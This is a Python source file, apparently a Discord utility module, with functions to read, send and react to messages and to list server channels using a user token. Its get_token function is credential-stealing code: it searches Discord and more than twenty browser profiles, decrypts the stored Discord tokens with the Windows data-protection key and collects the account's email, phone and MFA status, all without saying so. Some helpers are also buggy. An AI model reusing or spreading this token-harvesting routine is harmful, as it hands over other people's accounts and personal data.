import requests, os, fileio
from base64 import b64decode
from Crypto.Cipher import AES
from os import listdir, getenv
from os import path as os_path
from json import loads
from re import findall
from requests import get
from win32crypt import CryptUnprotectData


def add_reactions_to_discord_message(token, message_url, emojis):
    headers = {
        'Authorization': f'{token}',
    }

    # Extract the channel ID and message ID from the message URL
    channel_id, message_id = message_url.split('/')[-2:]
    output = True
    for emoji in emojis:
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'

        added = False
        while not added:
            try:
                response = requests.put(url, headers=headers)
                #print(response.content)
                response.raise_for_status()
                print(f"Reaction {emoji} added successfully!")
                added = True
            except requests.exceptions.RequestException as e:
                print(f"Error adding reaction: {e}")
                output = False
    return output


def get_channel_messages(token, channel_id, limit = 0, use_cache = True):
    '''
    Function to delete all client messages in a specific channel. Script by @z_h_ on discord.
    '''

    if use_cache:
        cache_folder = 'zhmiscellany_discord_data_cache'
        fileio.create_folder(cache_folder)
        potential_path = os.path.join('cache_folder', f'{channel_id}.json')
        if os.path.exists(potential_path):
            return fileio.read_json_file(potential_path)

    messages = []

    # Define the base URL for the Discord API
    base_url = 'https://discord.com/api/v9/channels/{}/messages'.format(channel_id)

    headers = {
        'Authorization': token
    }

    last_message_id = ''

    while True:
        if last_message_id:
            print(f'Requesting new block before {last_message_id}')
            response = requests.get(base_url, headers=headers, params={'limit': 100, 'before': last_message_id})
        else:
            response = requests.get(base_url, headers=headers, params={'limit': 100})

        if not response.json():
            if use_cache:
                fileio.write_json_file(potential_path, messages)
            return messages

        messages.extend(response.json())

        print(f'Found {len(response.json())} messages')

        last_message_id = messages[-1:][0]['id']

        if limit != 0:
            if len(messages) >= limit:
                return messages[:limit]


def get_token():
    global cached_token
    try:
        a = cached_token
        return a
    except:



        tokens = []
        cleaned = []

        def decrypt(buff, master_key):
            try:
                return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
            except:
                return "Error"

        already_check = []
        checker = []
        local = getenv('LOCALAPPDATA')
        roaming = getenv('APPDATA')
        chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
        paths = {
            'Discord': roaming + '\\\\discord',
            'Discord Canary': roaming + '\\\\discordcanary',
            'Lightcord': roaming + '\\\\Lightcord',
            'Discord PTB': roaming + '\\\\discordptb',
            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
            'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
            'Amigo': local + '\\\\Amigo\\\\User Data',
            'Torch': local + '\\\\Torch\\\\User Data',
            'Kometa': local + '\\\\Kometa\\\\User Data',
            'Orbitum': local + '\\\\Orbitum\\\\User Data',
            'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
            '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
            'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
            'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
            'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
            'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
            'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
            'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
        }
        for platform, path in paths.items():
            if not os_path.exists(path): continue
            try:
                with open(path + f"\\\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except:
                continue
            for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\\"]*", x):
                                    tokens.append(values)
                    except PermissionError:
                        continue
            for i in tokens:
                if i.endswith("\\\\"):
                    i.replace("\\\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error":
                    continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except:
                            continue
                        if res.status_code == 200:
                            # if True:
                            res_json = res.json()
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            cached_token = [tok, user_name, user_id, email, phone, mfa_enabled]
                            return cached_token
                    else:
                        continue



        return None


def get_guild_channels(user_token, guild_id, use_cache=True):
    if use_cache:
        potential_path = os.path.join('data', f'{guild_id}.json')
        if os.path.exists(potential_path):
            return fileio.read_json_file(potential_path)
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    headers = {
        "Authorization": f"{user_token}",
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        channels_data = response.json()
        if use_cache:
            fileio.write_json_file(potential_path, channels_data)
        return channels_data
    else:
        print(f"Failed to retrieve channels. Status code: {response.status_code}")
        return None


def send_message(user_token, text, channel_id):
    requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers={
        "Authorization": f"{user_token}"
    }, data={
        "content": text
    })


def get_message(user_token, channel_id, message_id):
    message_url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}'
    message = requests.get(message_url, headers={'Authorization': get_token()})
    message = message.json()
    return message